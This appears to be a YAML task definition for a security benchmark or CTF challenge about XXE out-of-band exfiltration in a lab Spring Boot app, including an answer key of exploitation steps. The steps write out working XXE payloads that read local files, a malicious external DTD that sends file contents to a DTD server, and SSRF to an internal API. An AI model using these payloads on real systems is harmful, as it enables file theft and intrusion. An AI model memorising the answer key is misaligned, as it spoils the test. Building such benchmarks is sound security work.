id: S7BEN-VHARD-007
name: "XXE Out-of-Band Data Exfiltration"
tier: 2
difficulty: 9
category: vhard
description: "Java Spring Boot application that parses XML input, with an internal API and an external DTD server."
objective: "Obtain the flags from the web application and internal service via XML processing."
vulnerabilities:
  - type: XML External Entity Injection
    cwes: [CWE-611]
owasp_2025: [A05:2025]
difficulty_dimensions:
  recon: medium
  exploit: very_high
  chaining: high
architecture:
  type: microservices
  container_count: 3
  services:
    - name: web-app
      port: 8080
      exposed: true
    - name: internal-api
      port: 5000
      exposed: false
    - name: dtd-server
      port: 8888
      exposed: true
hints: []
tags: [xxe, xml, out-of-band, java, spring-boot, dtd, file-disclosure]
internal_metadata:
  exploitation_path:
    hints:
      - "The web application exposes an XML parsing endpoint"
      - "The Java DocumentBuilder is configured without security features, enabling external entity resolution"
      - "file:// protocol can be used to read local files"
      - "The dtd-server at port 8888 can host attacker-controlled DTD files"
      - "Parameter entities in external DTDs enable out-of-band data exfiltration"
      - "http:// protocol can be used to access internal services (SSRF via XXE)"
    steps:
      - "Identify the /api/xml/parse endpoint (or equivalent) accepting XML input"
      - "Test basic XXE: inject <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>"
      - "Read /app/flag.txt via file:// XXE to obtain the first flag"
      - "Host a malicious DTD on the dtd-server: <!ENTITY % data SYSTEM \"file:///app/flag.txt\"> <!ENTITY % exfil \"<!ENTITY &#x25; send SYSTEM 'http://dtd-server:8888/?d=%data;'>\">"
      - "Reference the external DTD in your XXE payload to achieve out-of-band exfiltration"
      - "Use XXE with http://internal-api:5000/ to access the internal API and read /data/internal_flag.txt"
